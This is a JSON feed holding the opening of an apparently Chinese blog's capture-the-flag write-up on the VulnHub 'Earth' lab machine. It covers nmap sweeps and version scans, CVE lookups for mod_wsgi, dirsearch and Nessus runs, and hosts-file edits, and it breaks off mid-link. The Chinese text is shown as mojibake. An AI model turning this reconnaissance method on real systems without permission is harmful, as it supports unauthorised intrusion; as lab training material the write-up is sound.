{
    "version": "https://jsonfeed.org/version/1",
    "title": "Glad to see U (â—¦Ë™â–½Ë™â—¦)",
    "subtitle": "With Great Power Comes Great Responsibilities",
    "icon": "https://ctf-learner.github.io/assets/favicon.ico",
    "description": "With Great Power Comes Great Responsibilities",
    "home_page_url": "https://ctf-learner.github.io",
    "items": [
        {
            "id": "https://ctf-learner.github.io/post/Get-Earth-Shell/",
            "url": "https://ctf-learner.github.io/post/Get-Earth-Shell/",
            "title": "Get Earth Shell",
            "date_published": "2024-05-05T12:45:35.000Z",
            "content_html": "<p><span class=\"label success\">ä¸Šæ¬¡æ›´æ–°æ—¶é—´ï¼š2024-05-05</span></p>\n<p>è¡Œæ˜Ÿç³»åˆ—é¶æœº â€”â€”â€”Earthã€‚</p>\n<p>æ–°æ‰‹çš„ç¬¬äºŒæ¬¡å®æˆ˜ï¼Œå­¦åˆ°çš„éƒ½æ˜¯æ»¡æ»¡çš„çŸ¥è¯†ï¼Œä¸€è·¯ä¸Šèµ°äº†è®¸å¤šå¼¯è·¯ï¼Œä¸è®¤è¯†æ¡†æ¶ï¼Œçœ‹ä¸æ‡‚ Linux çš„æƒé™æœºåˆ¶ï¼Œè¶Šæƒæ—¶æ‰¾ä¸åˆ°æ–¹å‘ç­‰ç­‰ç­‰ç­‰ï¼Œåœ¨æœªçŸ¥ä¸­æ‘¸ç´¢ï¼Œäº«å— blackbox çš„ä¹è¶£ï¼Œæœªæ¥çš„è·¯å¾ˆé•¿ï¼Œè‚©ä¸Šçš„æ‹…å­è¿˜å¾ˆé‡ã€‚</p>\n<p><a href=\"https://www.vulnhub.com/entry/the-planets-earth,755/\">The Planets: Earth ~ VulnHub</a></p>\n<p>Earth é¶æœºä¸‹è½½ï¼š<a href=\"https://download.vulnhub.com/theplanets/Earth.ova\">https://download.vulnhub.com/theplanets/Earth.ova</a></p>\n<p><img loading=\"lazy\" data-src=\"/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240502230855254.png\" alt=\"image-20240502230855254\" /></p>\n<p>kali ip åœ°å€ï¼š192.168.81.129</p>\n<h1 id=\"ä¸»æœºå‘ç°\"><a class=\"anchor\" href=\"#ä¸»æœºå‘ç°\">#</a> ä¸»æœºå‘ç°</h1>\n<p>è€æ ·å­ï¼Œå…ˆ nmap ç®€å•æ‰«ä¸€ä¸‹ï¼š</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>å¯¹ç…§macåœ°å€å¯»æ‰¾ip</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>â””â”€$ nmap <span class=\"token parameter variable\">-sP</span> <span class=\"token number\">192.168</span>.81.0/24</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Starting Nmap <span class=\"token number\">7</span>.94SVN <span class=\"token punctuation\">(</span> https://nmap.org <span class=\"token punctuation\">)</span> at <span class=\"token number\">2024</span>-05-02 <span class=\"token number\">11</span>:11 EDT</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Nmap scan report <span class=\"token keyword\">for</span> <span class=\"token number\">192.168</span>.81.1</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Host is up <span class=\"token punctuation\">(</span><span class=\"token number\">0</span>.0026s latency<span class=\"token punctuation\">)</span>.</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>MAC Address: 00:50:56:C0:00:08 <span class=\"token punctuation\">(</span>VMware<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Nmap scan report <span class=\"token keyword\">for</span> <span class=\"token number\">192.168</span>.81.2</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Host is up <span class=\"token punctuation\">(</span><span class=\"token number\">0</span>.00032s latency<span class=\"token punctuation\">)</span>.</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>MAC Address: 00:50:56:E2:03:BD <span class=\"token punctuation\">(</span>VMware<span class=\"token punctuation\">)</span></pre></td></tr><tr class=\"marked\"><td data-num=\"9\"></td><td><pre>Nmap scan report <span class=\"token keyword\">for</span> <span class=\"token number\">192.168</span>.81.131     <span class=\"token comment\">#  Earth é¶æœº ip åœ°å€</span></pre></td></tr><tr class=\"marked\"><td data-num=\"10\"></td><td><pre>Host is up <span class=\"token punctuation\">(</span><span class=\"token number\">0</span>.00085s latency<span class=\"token punctuation\">)</span>.</pre></td></tr><tr class=\"marked\"><td data-num=\"11\"></td><td><pre>MAC Address: 00:50:56:2B:3B:46 <span class=\"token punctuation\">(</span>VMware<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># å‘ç° mac åœ°å€ï¼Œé”å®šè¿™å°±æ˜¯é¶æœº</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>Nmap scan report <span class=\"token keyword\">for</span> <span class=\"token number\">192.168</span>.81.254</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>Host is up <span class=\"token punctuation\">(</span><span class=\"token number\">0</span>.00037s latency<span class=\"token punctuation\">)</span>.</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>MAC Address: 00:50:56:E9:20:9C <span class=\"token punctuation\">(</span>VMware<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>Nmap scan report <span class=\"token keyword\">for</span> <span class=\"token number\">192.168</span>.81.129</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>Host is up.</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>Nmap done: <span class=\"token number\">256</span> IP addresses <span class=\"token punctuation\">(</span><span class=\"token number\">5</span> hosts up<span class=\"token punctuation\">)</span> scanned <span class=\"token keyword\">in</span> <span class=\"token number\">4.34</span> seconds</pre></td></tr></table></figure><p>ç„¶åæ·±åº¦æ‰«æä¸€ä¸‹ç«¯å£ï¼š</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>æ·±åº¦æ‰«æ</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>â””â”€$ nmap <span class=\"token parameter variable\">-sV</span> <span class=\"token parameter variable\">-A</span> <span class=\"token number\">192.168</span>.81.131    <span class=\"token comment\">#  -sV -A  æ‰«æç³»ç»Ÿç‰ˆæœ¬å’Œå¼€å¯ç«¯å£çš„æœåŠ¡</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Starting Nmap <span class=\"token number\">7</span>.94SVN <span class=\"token punctuation\">(</span> https://nmap.org <span class=\"token punctuation\">)</span> at <span class=\"token number\">2024</span>-05-02 <span class=\"token number\">11</span>:13 EDT</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Nmap scan report <span class=\"token keyword\">for</span> <span class=\"token number\">192.168</span>.81.131</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Host is up <span class=\"token punctuation\">(</span><span class=\"token number\">0</span>.0013s latency<span class=\"token punctuation\">)</span>.</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Not shown: <span class=\"token number\">987</span> filtered tcp ports <span class=\"token punctuation\">(</span>no-response<span class=\"token punctuation\">)</span>, <span class=\"token number\">10</span> filtered tcp ports <span class=\"token punctuation\">(</span>admin-prohibited<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>PORT    STATE SERVICE  VERSION</pre></td></tr><tr class=\"marked\"><td data-num=\"7\"></td><td><pre><span class=\"token number\">22</span>/tcp  <span class=\"token function\">open</span>  <span class=\"token function\">ssh</span>      OpenSSH <span class=\"token number\">8.6</span> <span class=\"token punctuation\">(</span>protocol <span class=\"token number\">2.0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token operator\">|</span> ssh-hostkey: </pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token operator\">|</span>   <span class=\"token number\">256</span> 5b:2c:3f:dc:8b:76:e9:21:7b:d0:56:24:df:be:e9:a8 <span class=\"token punctuation\">(</span>ECDSA<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token operator\">|</span>_  <span class=\"token number\">256</span> b0:3c:72:3b:72:21:26:ce:3a:84:e8:41:ec:c8:f8:41 <span class=\"token punctuation\">(</span>ED25519<span class=\"token punctuation\">)</span></pre></td></tr><tr class=\"marked\"><td data-num=\"11\"></td><td><pre><span class=\"token number\">80</span>/tcp  <span class=\"token function\">open</span>  http     Apache httpd <span class=\"token number\">2.4</span>.51 <span class=\"token punctuation\">((</span>Fedora<span class=\"token punctuation\">)</span> OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token operator\">|</span>_http-title: Bad Request <span class=\"token punctuation\">(</span><span class=\"token number\">400</span><span class=\"token punctuation\">)</span>   <span class=\"token comment\">#  apache æœåŠ¡å™¨ python ç‰ˆæœ¬ 3.9</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token operator\">|</span>_http-server-header: Apache/2.4.51 <span class=\"token punctuation\">(</span>Fedora<span class=\"token punctuation\">)</span> OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9</pre></td></tr><tr class=\"marked\"><td data-num=\"14\"></td><td><pre><span class=\"token number\">443</span>/tcp <span class=\"token function\">open</span>  ssl/http Apache httpd <span class=\"token number\">2.4</span>.51 <span class=\"token punctuation\">((</span>Fedora<span class=\"token punctuation\">)</span> OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token operator\">|</span>_ssl-date: TLS randomness does not represent <span class=\"token function\">time</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token operator\">|</span>_http-server-header: Apache/2.4.51 <span class=\"token punctuation\">(</span>Fedora<span class=\"token punctuation\">)</span> OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9</pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token operator\">|</span> tls-alpn: </pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token operator\">|</span>_  http/1.1</pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token operator\">|</span>_http-title: Bad Request <span class=\"token punctuation\">(</span><span class=\"token number\">400</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token operator\">|</span> ssl-cert: Subject: <span class=\"token assign-left variable\">commonName</span><span class=\"token operator\">=</span>earth.local/stateOrProvinceName<span class=\"token operator\">=</span>Space</pre></td></tr><tr class=\"marked\"><td data-num=\"21\"></td><td><pre><span class=\"token operator\">|</span> Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local   //  æ²¡ä»”ç»†çœ‹å°±æ¼äº†è¿™é‡Œ</pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token operator\">|</span> Not valid before: <span class=\"token number\">2021</span>-10-12T23:26:31</pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token operator\">|</span>_Not valid after:  <span class=\"token number\">2031</span>-10-10T23:26:31</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>MAC Address: 00:50:56:2B:3B:46 <span class=\"token punctuation\">(</span>VMware<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>Warning: OSScan results may be unreliable because we could not <span class=\"token function\">find</span> at least <span class=\"token number\">1</span> <span class=\"token function\">open</span> and <span class=\"token number\">1</span> closed port</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>Device type: general purpose<span class=\"token operator\">|</span>storage-misc   <span class=\"token comment\">#  è®¾å¤‡ç±»å‹</span></pre></td></tr><tr class=\"marked\"><td data-num=\"27\"></td><td><pre>Running <span class=\"token punctuation\">(</span>JUST GUESSING<span class=\"token punctuation\">)</span>: Linux <span class=\"token number\">4</span>.X<span class=\"token operator\">|</span><span class=\"token number\">5</span>.X<span class=\"token operator\">|</span><span class=\"token number\">2.6</span>.X<span class=\"token operator\">|</span><span class=\"token number\">3</span>.X <span class=\"token punctuation\">(</span><span class=\"token number\">97</span>%<span class=\"token punctuation\">)</span>, Synology DiskStation Manager <span class=\"token number\">5</span>.X <span class=\"token punctuation\">(</span><span class=\"token number\">90</span>%<span class=\"token punctuation\">)</span>, Netgear RAIDiator <span class=\"token number\">4</span>.X <span class=\"token punctuation\">(</span><span class=\"token number\">87</span>%<span class=\"token punctuation\">)</span>    <span class=\"token comment\">#  ç³»ç»Ÿè¿è¡Œå†…æ ¸ç‰ˆæœ¬</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:3 cpe:/a:synology:diskstation_manager:5.2 cpe:/o:netgear:raidiator:4.2.28</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>Aggressive OS guesses: Linux <span class=\"token number\">4.15</span> - <span class=\"token number\">5.8</span> <span class=\"token punctuation\">(</span><span class=\"token number\">97</span>%<span class=\"token punctuation\">)</span>, Linux <span class=\"token number\">5.0</span> - <span class=\"token number\">5.4</span> <span class=\"token punctuation\">(</span><span class=\"token number\">97</span>%<span class=\"token punctuation\">)</span>, Linux <span class=\"token number\">5.0</span> - <span class=\"token number\">5.5</span> <span class=\"token punctuation\">(</span><span class=\"token number\">95</span>%<span class=\"token punctuation\">)</span>, Linux <span class=\"token number\">2.6</span>.32 <span class=\"token punctuation\">(</span><span class=\"token number\">91</span>%<span class=\"token punctuation\">)</span>, Linux <span class=\"token number\">3.10</span> - <span class=\"token number\">4.11</span> <span class=\"token punctuation\">(</span><span class=\"token number\">91</span>%<span class=\"token punctuation\">)</span>, Linux <span class=\"token number\">3.2</span> - <span class=\"token number\">4.9</span> <span class=\"token punctuation\">(</span><span class=\"token number\">91</span>%<span class=\"token punctuation\">)</span>, Linux <span class=\"token number\">3.4</span> - <span class=\"token number\">3.10</span> <span class=\"token punctuation\">(</span><span class=\"token number\">91</span>%<span class=\"token punctuation\">)</span>, Linux <span class=\"token number\">5.1</span> <span class=\"token punctuation\">(</span><span class=\"token number\">91</span>%<span class=\"token punctuation\">)</span>, Linux <span class=\"token number\">2.6</span>.32 - <span class=\"token number\">3.10</span> <span class=\"token punctuation\">(</span><span class=\"token number\">91</span>%<span class=\"token punctuation\">)</span>, Linux <span class=\"token number\">2.6</span>.32 - <span class=\"token number\">3.13</span> <span class=\"token punctuation\">(</span><span class=\"token number\">91</span>%<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>No exact OS matches <span class=\"token keyword\">for</span> <span class=\"token function\">host</span> <span class=\"token punctuation\">(</span>test conditions non-ideal<span class=\"token punctuation\">)</span>.</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>Network Distance: <span class=\"token number\">1</span> hop</pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>TRACEROUTE</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>HOP RTT     ADDRESS</pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token number\">1</span>   <span class=\"token number\">1.29</span> ms <span class=\"token number\">192.168</span>.81.131</pre></td></tr></table></figure><p>å¾ˆä¸å¹¸ï¼Œ80 ç«¯å£å’Œ 443 ç«¯å£éƒ½æŠ¥ 400ï¼Œå¹¶ä¸”é¶æœºç³»ç»Ÿå†…æ ¸çš„ç‰ˆæœ¬å·ä¹Ÿä¸ç¡®å®šã€‚</p>\n<p><img loading=\"lazy\" data-src=\"/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240502232516042.png\" alt=\"image-20240502232516042\" /></p>\n<p>å‡ºå¸ˆä¸åˆ©ã€‚å…³æ³¨åˆ°æœ‰ä¸€ä¸ªä¸å¯»å¸¸çš„ä½ç½®ğŸ‘‡ï¼š</p>\n<p><img loading=\"lazy\" data-src=\"/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240503124531809.png\" alt=\"image-20240503124531809\" /></p>\n<h1 id=\"ç»•äº†ä¸€å †å¼¯å­\"><a class=\"anchor\" href=\"#ç»•äº†ä¸€å †å¼¯å­\">#</a> ç»•äº†ä¸€å †å¼¯å­</h1>\n<p>è¿™ä¸ª mod_wsgi æ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿ï¼Ÿçœ‹çœ‹è¿™é‡ŒğŸ‘‰<a href=\"https://www.liaoxuefeng.com/wiki/1016959663602400/1017805733037760\">WSGI æ¥å£ - å»–é›ªå³°çš„å®˜æ–¹ç½‘ç«™ (liaoxuefeng.com)</a></p>\n<p>é€šä¿—ç†è§£ï¼šå®é™…ä¸Š WSGI æ˜¯åº•å±‚å¤„ç† TCP è¿æ¥ã€HTTP åŸå§‹è¯·æ±‚å’Œå“åº”æ ¼å¼ç»Ÿä¸€çš„æ¥å£ã€‚Flask åº•å±‚ä½¿ç”¨çš„å°±æ˜¯ WSGI åè®®ã€‚</p>\n<p>ç„¶åå»çœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆ CVEï¼Œæœå‡ºæ¥ä¸¤ä¸ªç»“æœï¼š</p>\n<p>â‘ ç›®å½•ç©¿è¶Šæ¼æ´ï¼Œç”¨ %2f ç»•è¿‡ /ï¼Œå¯ä»¥ä»»æ„æ–‡ä»¶è¯»å–ã€‚ğŸ‘‡</p>\n<p><img loading=\"lazy\" data-src=\"/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240503125209575.png\" alt=\"image-20240503125209575\" /></p>\n<p>è¯•äº†ä¸€ä¸²æ²¡æœ‰ä»€ä¹ˆä½œç”¨ã€‚</p>\n<p>â‘¡CVE-2014-0240</p>\n<blockquote>\n<p>å½“å¯ç”¨å®ˆæŠ¤ç¨‹åºæ¨¡å¼æ—¶ï¼ŒApache çš„ 3.5 ä¹‹å‰çš„ mod_wsgi æ¨¡å—åœ¨æŸäº› Linux å†…æ ¸ä¸Šè¿è¡Œæ—¶æ— æ³•æ­£ç¡®å¤„ç† setuid è¿”å›çš„é”™è¯¯ä»£ç ï¼Œè¿™å…è®¸æœ¬åœ°ç”¨æˆ·é€šè¿‡ä¸æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹æ•°é‡ç›¸å…³çš„å‘é‡è·å¾—æƒé™ã€‚</p>\n</blockquote>\n<p><img loading=\"lazy\" data-src=\"/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240503130323202.png\" alt=\"image-20240503130323202\" /></p>\n<p>æœäº†å¥½å¤šï¼Œæ²¡æœ‰å¤ç°æ–‡å­—ï¼Œå¹¶ä¸”è¿˜æ²¡åˆ°è¶Šæƒé‚£ä¸€æ­¥ã€‚msf search ä¹Ÿæ²¡æœ‰æœç´¢åˆ°</p>\n<p>åŒæ—¶ dirsearch ä¹Ÿè·‘äº†ä¸€ä¸‹ï¼Œä¾ç„¶ä¸€æ— æ‰€è·ã€‚</p>\n<p><img loading=\"lazy\" data-src=\"/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240503130743214.png\" alt=\"image-20240503130743214\" /></p>\n<p>æ²¡æ‹›äº†ï¼Œç”¨ Nessus è¯•ä¸€ä¸‹ã€‚</p>\n<p><img loading=\"lazy\" data-src=\"/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240503185129589.png\" alt=\"image-20240503185129589\" /></p>\n<p>æ‰“å¼€çœ‹åˆ°æœ‰å‡ ä¸ªé‡å¤§æ¼æ´ï¼Œè¿˜æ˜¯æ²¡æœ‰æ‰¾åˆ°åˆ©ç”¨çš„å…¥å£ã€‚</p>\n<h1 id=\"dnsåŸŸåè§£æé—®é¢˜\"><a class=\"anchor\" href=\"#dnsåŸŸåè§£æé—®é¢˜\">#</a> DNS åŸŸåè§£æé—®é¢˜</h1>\n<p>åªèƒ½æœä¸€ä¸‹ wpï¼Œæ‰å‘ç°è‡ªå·±é—æ¼äº†è¿™ä¸ªç‚¹ğŸ‘‡<span class=\"spoiler\" title=\"ä½ çŸ¥é“å¾—å¤ªå¤šäº†\">æ²¡ä»€ä¹ˆç»éªŒï¼Œå¤§ä½¬å‹¿å–·</span></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>ç¬¬å…«è¡ŒDNSè§£æ</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">443</span>/tcp <span class=\"token function\">open</span>  ssl/http Apache httpd <span class=\"token number\">2.4</span>.51 <span class=\"token punctuation\">((</span>Fedora<span class=\"token punctuation\">)</span> OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">|</span>_ssl-date: TLS randomness does not represent <span class=\"token function\">time</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">|</span>_http-server-header: Apache/2.4.51 <span class=\"token punctuation\">(</span>Fedora<span class=\"token punctuation\">)</span> OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">|</span> tls-alpn: </pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">|</span>_  http/1.1</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token operator\">|</span>_http-title: Bad Request <span class=\"token punctuation\">(</span><span class=\"token number\">400</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token operator\">|</span> ssl-cert: Subject: <span class=\"token assign-left variable\">commonName</span><span class=\"token operator\">=</span>earth.local/stateOrProvinceName<span class=\"token operator\">=</span>Space</pre></td></tr><tr class=\"marked\"><td data-num=\"8\"></td><td><pre><span class=\"token operator\">|</span> Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local   <span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span></pre></td></tr></table></figure><p>æ‰å‘ç°ç”¨ ip åœ°å€æ˜¯æ— æ³•æ­£å¸¸è®¿é—®ï¼Œéœ€è¦æ·»åŠ  DNS è§£æã€‚</p>\n<p>æ‰€ä»¥ä¿®æ”¹ hosts æ–‡ä»¶ï¼ˆæœ¬æœºçš„æˆ–è€… kali çš„ï¼‰ï¼Œè·¯å¾„ï¼š <code>C:\\Windows\\System32\\drivers\\etc</code> ï¼ˆ <code>/etc/hosts</code> ï¼‰</p>\n<figure class=\"highlight text\"><figcaption data-lang=\"text\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>192.168.81.131 earth.local</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>192.168.81.131  terratest.earth.local</pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240503131304539.png\" alt=\"image-20240503131304539\" /></p>\n<p>ä¿®æ”¹å®Œä¸€èˆ¬ä¼šç«‹å³ç”Ÿæ•ˆï¼Œè‹¥æ²¡ç”Ÿæ•ˆå¯ä»¥åœ¨ powershell æˆ–è€… cmd ä¸­åˆ·æ–° DNS è§£æé…ç½®ï¼š   <code>ipconfig /flushdns</code></p>\n<h1 id=\"åå‘ä»£ç†è¯ä¹¦éªŒè¯\"><a class=\"anchor\" href=\"#åå‘ä»£ç†è¯ä¹¦éªŒè¯\">#</a> åå‘ä»£ç†ï¼Ÿï¼è¯ä¹¦éªŒè¯ï¼Ÿï¼</h1>\n<p>å‡ºäºå¥½å¥‡æˆ‘ä¹Ÿæœäº†ä¸€ä¸‹åŸå› ï¼š</p>\n<p>ğŸ¤–GPT: å¯èƒ½çš„åŸå› æœ‰ğŸ‘‡</p>\n<ol>\n<li class=\"lvl-3\">\n<p><strong>è¯ä¹¦éªŒè¯</strong>ï¼šå¦‚å‰æ‰€è¿°ï¼Œå¦‚æœæœåŠ¡å™¨é…ç½®äº† SSL/TLS è¯ä¹¦ï¼Œå¹¶ä¸”è¯ä¹¦ä¸­åŒ…å«äº†åŸŸåä½œä¸ºä¸»é¢˜å¤‡ç”¨åç§°ï¼ˆSANï¼‰ï¼Œé‚£ä¹ˆä½¿ç”¨åŸŸåè®¿é—®æ—¶ï¼Œæµè§ˆå™¨æˆ–å®¢æˆ·ç«¯èƒ½å¤ŸéªŒè¯æœåŠ¡å™¨çš„èº«ä»½ã€‚è€Œç›´æ¥ä½¿ç”¨ IP åœ°å€è®¿é—®æ—¶ï¼Œç”±äºç¼ºä¹åŸŸåä¿¡æ¯ï¼ŒSSL/TLS è¯ä¹¦çš„éªŒè¯å¯èƒ½ä¼šå¤±è´¥ï¼Œå¯¼è‡´ 400 é”™è¯¯ã€‚</p>\n</li>\n<li class=\"lvl-3\">\n<p><strong>é˜²ç«å¢™æˆ–å®‰å…¨è§„åˆ™</strong>ï¼šæœåŠ¡å™¨çš„é˜²ç«å¢™æˆ–å®‰å…¨è§„åˆ™å¯èƒ½é…ç½®ä¸ºä»…æ¥å—æ¥è‡ªç‰¹å®šåŸŸåçš„è¯·æ±‚ï¼Œè€Œæ‹’ç»æ¥è‡ª IP åœ°å€çš„è¯·æ±‚ã€‚</p>\n</li>\n<li class=\"lvl-3\">\n<p><strong>æœåŠ¡å™¨è´Ÿè½½å‡è¡¡å™¨æˆ–åå‘ä»£ç†</strong>ï¼šå¦‚æœæœåŠ¡å™¨åç«¯ä½¿ç”¨äº†è´Ÿè½½å‡è¡¡å™¨æˆ–åå‘ä»£ç†ï¼Œå®ƒä»¬å¯èƒ½æ ¹æ®è¯·æ±‚çš„åŸŸåæ¥å†³å®šå¦‚ä½•è·¯ç”±è¯·æ±‚ï¼Œè€Œç›´æ¥ä½¿ç”¨ IP åœ°å€å¯èƒ½ä¸ä¼šç»è¿‡ç›¸åŒçš„è·¯ç”±é€»è¾‘ã€‚</p>\n</li>\n</ol>\n<details class=\"info\"><summary>åå‘ä»£ç†æ˜¯ä»€ä¹ˆé¬¼ï¼Ÿ</summary><div>\n<p>å…ˆè¯´æ­£å‘ä»£ç†ï¼š</p>\n<p>æ­£å¸¸ä»£ç†æœåŠ¡å™¨ï¼ˆä¸­é—´äººï¼‰ä¸€èˆ¬åœ¨å®¢æˆ·ç«¯åˆ°æœåŠ¡å™¨ä¹‹é—´ã€‚</p>\n<blockquote>\n<p>æµè§ˆå™¨ï¼ˆå®¢æˆ·ç«¯ï¼‰ ----(request)----&gt;    ä¸­é—´äººï¼ˆä»£ç†æœåŠ¡å™¨ï¼‰------&gt;  ç›®æ ‡æœåŠ¡å™¨    ----------&gt;   ä¸­é—´äººï¼ˆä»£ç†æœåŠ¡å™¨ï¼‰-----(response)----&gt; æµè§ˆå™¨ï¼ˆå®¢æˆ·ç«¯ï¼‰</p>\n</blockquote>\n<p>é»„ç‰›æŠ¢ç¥¨ï¼Œä¸­ä»‹å–æˆ¿ï¼Œä¸Šè¯¾ä¼ çº¸æ¡â€¦â€¦ éƒ½æ˜¯æ­£å‘ä»£ç†ã€‚<strong>æ­£å‘ä»£ç†ï¼Œå…¶å®æ˜¯ &quot;ä»£ç†æœåŠ¡å™¨&quot; ä»£ç†äº† &quot;å®¢æˆ·ç«¯&quot;ï¼Œå»å’Œ &quot;ç›®æ ‡æœåŠ¡å™¨&quot; è¿›è¡Œäº¤äº’ã€‚</strong></p>\n<p>æ­£å‘ä»£ç†å¯ä»¥ï¼šçªç ´è®¿é—®é™åˆ¶ã€æé«˜è®¿é—®é€Ÿåº¦ã€éšè—å®¢æˆ·ç«¯çœŸå® IPã€‚</p>\n<p><strong>é‚£ä¹ˆåå‘ä»£ç†å°±æ˜¯ï¼š</strong></p>\n<blockquote>\n<p>æµè§ˆå™¨ï¼ˆå®¢æˆ·ç«¯ï¼‰ ----(request)----&gt; ä¸­è½¬æœåŠ¡å™¨ ---(Request parsing)---&gt;  ç›®æ ‡æœåŠ¡å™¨    ---(response)----&gt; æµè§ˆå™¨ï¼ˆå®¢æˆ·ç«¯ï¼‰</p>\n</blockquote>\n<p>è€Œåå‘ä»£ç†æ˜¯åœ¨è¯·æ±‚åˆ°è¾¾æœåŠ¡å™¨ä¹‹åï¼Œ<strong>&quot;ä»£ç†æœåŠ¡å™¨&quot; ä»£è¡¨äº† &quot;ç›®æ ‡æœåŠ¡å™¨&quot;ï¼Œå»å’Œ &quot;å®¢æˆ·ç«¯&quot; è¿›è¡Œäº¤äº’ã€‚</strong></p>\n<p>å› æ­¤åœ¨è¿™é‡Œè¯·æ±‚ ip åœ°å€ <code>192.168.81.131</code>  æœ‰å¯èƒ½ä¸æ˜¯æœåŠ¡å™¨çœŸå®çš„åœ°å€ï¼Œè€Œæ˜¯ä¸€ä¸ª nginx ä»£ç†æœåŠ¡å™¨æˆ–è€…æ˜¯ä¸€ä¸ª DNS è§£ææœåŠ¡å™¨ï¼Œè€Œæˆ‘ä»¬çš„åŸŸååˆ°è¾¾åå†è§£æåˆ°å¯¹åº”çš„æœåŠ¡ä¸Šï¼›ä¹Ÿæœ‰å¯èƒ½æ˜¯è™šæ‹Ÿä¸»æœºâ€¦â€¦</p>\n</div></details>\n<p><a href=\"https://blog.csdn.net/gui951753/article/details/83070180\">ä¸ºä»€ä¹ˆåŸŸåèƒ½å¤Ÿè®¿é—®ç½‘ç«™ï¼Œè€Œç›´æ¥ä½¿ç”¨ IP 